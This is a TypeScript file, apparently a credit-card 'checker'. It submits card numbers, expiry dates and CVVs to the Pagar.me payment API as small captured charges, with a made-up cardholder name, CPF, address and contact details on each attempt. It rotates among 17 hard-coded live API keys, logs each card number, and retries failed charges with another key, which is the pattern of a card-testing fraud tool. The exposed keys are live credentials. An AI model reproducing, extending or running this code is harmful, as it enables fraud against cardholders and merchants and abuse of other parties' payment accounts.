import axios from 'axios'
import { generateRandomData } from '../functions/createRandomPerson'
import { validateCardNotAmex } from '../functions/validateCardNotAmex'

interface Card {
  cc: string
  mes: string
  ano: string
  cvv: string
}

interface Return {
  status: number
  bandeira: string
  returnCode: string
  amount: number
  responseMessage: string
}

function mudarChave() {
  const chaves = [
    'ak_live_OpK9F8oNC8Pc1WGCpXt8vQuFC6okWw',
    'ak_live_mv6VgQW70nfG2krAitKYBPydTiH2fe',
    'ak_live_sn4F95bqB5p7f5wLSmfM5MhG9a5ZOA',
    'ak_live_2kIqGbkT5DNdLq56k0VMaJq6xJ5liG',
    'ak_live_RbMC9x08JFjhvJVqmWs4NGUl3Zwz42',
    'ak_live_0z5cN9xkMwYp2PpNH5imVJ1WseYggS',
    'ak_live_IjdjjFfoin48h6d34KcnDAPVQEPNH2',
    'ak_live_NrYNX6P1hcQZvgdSx3PPiG6pESS55i',
    'ak_live_WdOzCWWQo7Z2ChRGqaELJCelNyz23q',
    'ak_live_74mj2Niy7g1UTE3nUcaR9lp0ZWcSmT',
    'ak_live_jGFJmTVN96aMIUg6QN8mpMboDVQCdS',
    'ak_live_hq37l7mCPrnj2mIHRn04a76cKFaam0',
    'ak_live_bfQIkWAWQF6s98jOwDvAW29adzA0qo',
    'ak_live_DZFiTEMYWlveRkyKSoR7RIhwhyZQc7',
    'ak_live_R6OaJnqic784aG1MuxrDcFoP54zTKW',
    'ak_live_80la8SWj0LFi8viNSLKZgEFhnnjhak',
    'ak_live_SZFb4KwZvxCQhBYlU2Hr5h3HnNs5iC',
  ]
  const randomIndex = Math.floor(Math.random() * chaves.length)
  return chaves[randomIndex]
}

let retestar = 0

export async function processarTransacao1({
  cc,
  mes,
  ano,
  cvv,
}: Card): Promise<Return> {
  validateCardNotAmex({
    cc,
    ano,
    cvv,
  })

  ano = ano.replace('20', '')
  let chave = mudarChave()

  const { name, surname, address, cpf, phone, email } =
    await generateRandomData()

  const payload = {
    amount: 100,
    card_holder_name: `${name} ${surname}`,
    card_expiration_date: mes + ano,
    card_number: cc,
    card_cvv: cvv,
    payment_method: 'credit_card',
    installments: '1',
    capture: 'true',
    customer: {
      address: {
        street: `${address}`,
        street_number: '15',
        neighborhood: 'palocci',
        zipcode: '22630010',
        city: 'Rio de Janeiro',
        state: 'RJ',
      },
      phone: {
        ddd: '11',
        number: `${phone}`,
      },
      name: `${name} ${surname}`,
      email: `${email}`,
      document_number: `${cpf}`,
    },
    local_time: 'Date',
  }

  console.log(cc)

  try {
    const response = await axios.post(
      `https://api.pagar.me/1/transactions?api_key=${chave}`,
      payload,
    )

    if (response.data.acquirer_response_code === null) {
      throw new Error('acquirer_response_code é nulo')
    }

    return {
      amount: response.data.amount,
      bandeira: response.data.card_brand,
      returnCode: response.data.acquirer_response_code,
      status: response.status,
      responseMessage: response.data.acquirer_response_message,
    }
  } catch (error: any) {
    if (error.message === 'acquirer_response_code é nulo') {
      return await processarTransacao1({
        ano,
        cc,
        cvv,
        mes,
      })
    } else {
      console.log(
        `Tentando novamente com uma nova chave - Tentativa ${retestar + 1}`,
      )
      if (retestar < 4) {
        retestar++
        chave = mudarChave()
        return await processarTransacao1({
          ano,
          cc,
          cvv,
          mes,
        })
      } else {
        retestar = 0
        console.log('Todas as chaves foram testadas. Transação falhou.')
        return {
          amount: 0,
          bandeira: '',
          returnCode: 'Todas as chaves foram testadas. Transação falhou.',
          status: 400,
          responseMessage: 'Todas as chaves foram testadas. Transação falhou.',
        }
      }
    }
  }
}
